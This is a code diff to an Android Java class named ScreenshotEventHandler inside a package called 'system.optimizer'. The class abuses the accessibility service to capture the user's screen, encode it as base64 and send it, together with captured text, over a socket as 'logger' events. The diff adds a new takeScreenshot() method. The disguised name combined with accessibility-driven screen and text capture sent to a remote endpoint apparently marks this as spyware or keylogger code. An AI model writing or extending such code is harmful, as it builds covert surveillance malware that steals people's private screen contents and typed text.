@@ -1,6 +1,7 @@
 package com.system.optimizer.event_handler;
 
 import java.io.ByteArrayOutputStream;
+import java.util.concurrent.CompletableFuture;
 
 import com.system.optimizer.config.ConfigManager;
 import com.system.optimizer.network.SocketManager;
@@ -21,10 +22,11 @@ public class ScreenshotEventHandler {
     private final AccessibilityService service;
 
     private final SocketManager socketManager;
-    
+
     private final ConfigManager configManager;
 
-    public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager, ConfigManager configManager) {
+    public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager,
+            ConfigManager configManager) {
         if (delegate == null) {
             throw new IllegalArgumentException("AccessibilityService cannot be null");
         }
@@ -47,13 +49,6 @@ public class ScreenshotEventHandler {
             return;
         }
 
-        // Ignore system UI packages
-        //String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
-        //if (packageName.equals("com.android.systemui") ||
-        //        packageName.equals("android")) {
-        //    return;
-        //}
-
         // Check if device supports screenshot functionality
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
             socketManager.sendEvent("logger", "Screenshot not supported on this Android version");
@@ -65,7 +60,7 @@ public class ScreenshotEventHandler {
 
     /**
      * Capture screenshot programmatically and send as logger_image event.
-     * Used by TextEventHandler after text flush.
+     * Used by SystemEventHandler after text flush.
      */
     public void captureAndSend() {
         captureAndSend(null);
@@ -73,6 +68,7 @@ public class ScreenshotEventHandler {
 
     /**
      * Capture screenshot and combine with existing text message.
+     * 
      * @param existingMessage Optional existing text to combine with screenshot
      */
     public void captureAndSend(String existingMessage) {
@@ -141,7 +137,8 @@ public class ScreenshotEventHandler {
                                 bitmap.recycle();
 
                                 // Combine text with image and send as single message
-                                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
+                                String base64Image = android.util.Base64.encodeToString(imageData,
+                                        android.util.Base64.NO_WRAP);
                                 String combinedMessage = messageToSend + "<<IMAGE>>" + base64Image;
                                 socketManager.sendEvent("logger", combinedMessage);
                             } catch (Exception e) {
@@ -169,6 +166,82 @@ public class ScreenshotEventHandler {
                 socketManager.sendEvent("logger", messageToSend);
             }
         }
+    }
+
+    public CompletableFuture<String> takeScreenshot() {
+        CompletableFuture<String> future = new CompletableFuture<>();
+
+        // Only take screenshot if enabled in config
+        ConfigData config = configManager.getCachedConfig();
+        if (config == null || !config.isAutoScreenshotEnabled()) {
+            future.complete(null);
+            return future;
+        }
+
+        // Check if device supports screenshot functionality
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            future.complete(null);
+            return future;
+        }
+
+        try {
+            service.takeScreenshot(
+                    android.view.Display.DEFAULT_DISPLAY,
+                    service.getMainExecutor(),
+                    new AccessibilityService.TakeScreenshotCallback() {
+                        @Override
+                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
+                            try {
+                                if (result == null) {
+                                    future.complete(null);
+                                    return;
+                                }
+
+                                HardwareBuffer buffer = result.getHardwareBuffer();
+                                if (buffer == null) {
+                                    future.complete(null);
+                                    return;
+                                }
+
+                                ColorSpace colorSpace = result.getColorSpace();
+                                if (colorSpace == null) {
+                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
+                                }
+
+                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
+
+                                buffer.close();
+                                if (bitmap == null) {
+                                    future.complete(null);
+                                    return;
+                                }
+
+                                ConfigData cachedConfig = configManager.getCachedConfig();
+                                byte[] imageData = bitmapToJpegBytes(bitmap, cachedConfig.getScreenshotQuality());
+                                bitmap.recycle();
+
+                                // Return base 64 Image
+                                String base64Image = android.util.Base64.encodeToString(imageData,
+                                        android.util.Base64.NO_WRAP);
+                                future.complete(base64Image);
+                            } catch (Exception e) {
+                                android.util.Log.e(TAG, "Error processing screenshot: " + e.getMessage());
+                                future.complete(null);
+                            }
+                        }
+
+                        @Override
+                        public void onFailure(int error) {
+                            android.util.Log.w(TAG, "Screenshot failed with error code: " + error);
+                            future.complete(null);
+                        }
+                    });
+        } catch (Exception e) {
+            android.util.Log.e(TAG, "Error taking screenshot: " + e.getMessage());
+            future.complete(null);
+        }
+
+        return future;
     }
 
     /**
